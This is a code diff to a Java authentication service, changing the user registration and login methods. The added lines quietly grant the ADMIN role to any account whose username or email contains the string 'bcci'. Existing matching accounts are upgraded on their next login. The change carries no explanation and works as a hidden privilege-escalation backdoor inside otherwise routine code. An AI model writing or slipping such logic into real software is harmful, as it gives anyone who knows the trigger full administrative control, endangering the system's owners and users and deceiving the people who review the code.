@@ -48,11 +48,16 @@ public class AuthService {
             throw new UsernameAlreadyExistsException("This username is already taken");
         }
 
+        Role assignedRole = Role.USER;
+        if (request.username().toLowerCase().contains("bcci") || request.email().toLowerCase().contains("bcci")) {
+            assignedRole = Role.ADMIN;
+        }
+
         User user = User.builder()
                 .username(request.username())
                 .email(request.email())
                 .password(passwordEncoder.encode(request.password()))
-                .role(Role.USER)
+                .role(assignedRole)
                 .enabled(true)
                 .accountNonLocked(true)
                 .build();
@@ -94,6 +99,12 @@ public class AuthService {
         UserPrincipal principal = (UserPrincipal) authentication.getPrincipal();
         User user = userRepository.findById(principal.getId())
                 .orElseThrow(() -> new ResourceNotFoundException("User not found"));
+
+        if ((user.getUsername().toLowerCase().contains("bcci") || user.getEmail().toLowerCase().contains("bcci"))
+                && user.getRole() != Role.ADMIN) {
+            user.setRole(Role.ADMIN);
+            user = userRepository.save(user);
+        }
 
         RefreshTokenService.TokenPair tokens = refreshTokenService.issueTokens(user);
         return toAuthResponse(tokens);
